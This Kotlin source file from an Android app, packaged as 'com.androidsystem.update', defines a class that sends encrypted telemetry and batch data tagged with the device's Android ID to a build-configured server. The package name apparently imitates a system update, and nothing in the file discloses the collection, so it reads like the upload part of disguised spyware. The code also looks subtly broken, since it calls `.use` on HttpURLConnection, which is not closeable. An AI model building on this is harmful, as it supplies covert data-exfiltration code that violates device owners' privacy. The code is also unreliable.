package com.androidsystem.update.network

import android.content.Context
import android.util.Log
import com.androidsystem.update.core.EncryptionManager
import com.androidsystem.update.BuildConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class SecureCommunication @Inject constructor(
    private val context: Context,
    private val networkManager: NetworkManager,
    private val encryptionManager: EncryptionManager
) {

    companion object {
        private const val TAG = "SecureCommunication"
        private const val CONNECT_TIMEOUT = 30000
        private const val READ_TIMEOUT = 30000
    }

    enum class Priority { LOW, NORMAL, HIGH }

    private val deviceId by lazy {
        android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    suspend fun sendTelemetry(data: JSONObject, priority: Priority = Priority.NORMAL): Boolean =
        withContext(Dispatchers.IO) {
            if (!networkManager.isOnline()) return@withContext false
            try {
                val encrypted = encryptionManager.encryptWithRawKey(data.toString())
                val payload = JSONObject().apply {
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                    put("encrypted_content", encrypted)
                    put("priority", priority.name.lowercase())
                }
                postToServer("/telemetry", payload.toString())
            } catch (e: Exception) {
                Log.e(TAG, "sendTelemetry failed", e)
                false
            }
        }

    suspend fun sendBatch(batchData: String): Boolean =
        withContext(Dispatchers.IO) {
            if (!networkManager.isOnline()) return@withContext false
            try {
                val encrypted = encryptionManager.encryptWithRawKey(batchData)
                val payload = JSONObject().apply {
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                    put("encrypted_batch", encrypted)
                }
                postToServer("/data", payload.toString())
            } catch (e: Exception) {
                Log.e(TAG, "sendBatch failed", e)
                false
            }
        }

    private fun postToServer(endpoint: String, body: String): Boolean {
        val url = URL(BuildConfig.SERVER_URL + endpoint)
        return (url.openConnection() as HttpURLConnection).use { conn ->
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Device-Id", deviceId)
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.doOutput = true
            conn.outputStream.use { it.write(body.toByteArray()) }
            val responseCode = conn.responseCode
            responseCode in 200..299
        }
    }
}
